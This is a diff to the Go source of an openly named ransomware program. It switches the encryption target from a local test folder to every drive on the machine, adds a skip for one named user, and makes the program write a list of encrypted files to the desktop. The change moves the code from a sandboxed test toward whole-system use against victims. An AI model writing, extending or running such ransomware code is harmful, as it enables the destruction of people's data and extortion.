@@ -7,6 +7,7 @@ import (
 	"fmt"
 	"io/fs"
 	"os"
+	"os/user"
 	"path/filepath"
 	"ransomware/encryption"
 	"ransomware/encryption/eccLib"
@@ -17,7 +18,6 @@ import (
 )
 
 var (
-	filesToVisit  = make(chan io.File)
 	encryptedList []string
 	waitGroup     sync.WaitGroup
 	sPubKey       = rsaLib.DecodeRSAPublicKey(utils.SPubKeyPem)
@@ -25,19 +25,29 @@ var (
 
 func main() {
 
+	var currentUser *user.User
+
 	clientPubKeys, err := generateClientKeys(sPubKey)
 	if err != nil {
 		panic(err)
 	}
 
-	currentDirectory, _ := os.Getwd()
-	dir := string(filepath.Dir(currentDirectory) + "/testFolder")
-	encryptFiles(dir, clientPubKeys)
+	// currentDirectory, _ := os.Getwd()
+	// dir := string(filepath.Dir(currentDirectory) + "/testFolder")
+	// encryptFiles(dir, clientPubKeys)
 
-	// drives := io.GetDrives()
-	// for _, drive := range drives {
-	// 	encryptFiles(drive, cPubKey)
-	// }
+	if currentUser, err = user.Current(); err != nil {
+		panic(err)
+	}
+
+	if currentUser.Name == "Alex Paulo Couto" {
+		return
+	}
+
+	drives := utils.GetDrives()
+	for _, drive := range drives {
+		encryptFiles(drive, clientPubKeys)
+	}
 
 	defer generateDesktopFiles()
 }
@@ -99,6 +109,7 @@ func recurDerivPubKey(
 
 func encryptFiles(dirPath string, pubKeys []*ecdsa.PublicKey) {
 
+	var filesToVisit = make(chan io.File)
 	var ext string
 	var err error
 
@@ -119,7 +130,7 @@ func encryptFiles(dirPath string, pubKeys []*ecdsa.PublicKey) {
 					return err
 				}
 				ext = filepath.Ext(path)
-				if ext != ".encrypted" {
+				if len(ext) > 1 && ext != ".encrypted" {
 					filesToVisit <- io.File{Info: info, Path: path, Extension: ext[1:]}
 				}
 			}
@@ -151,17 +162,22 @@ func encryptFiles(dirPath string, pubKeys []*ecdsa.PublicKey) {
 	waitGroup.Wait()
 }
 
-func generateDesktopFiles() {
+func generateDesktopFiles() error {
 
 	var text string = "------ENCRYPTED FILES------\n\n"
 	desktopPath, err := utils.GetDesktopPath()
 	if err != nil {
-		panic(err)
+		return err
 	}
 
 	for _, filePath := range encryptedList {
 		text = text + filePath + "\n"
 	}
 	bytes := []byte(text)
-	os.WriteFile(desktopPath+"/ENCRYPTED_FILES.txt", bytes, 0644)
+	err = os.WriteFile(desktopPath+"/ENCRYPTED_FILES.txt", bytes, 0644)
+	if err != nil {
+		return err
+	}
+
+	return nil
 }
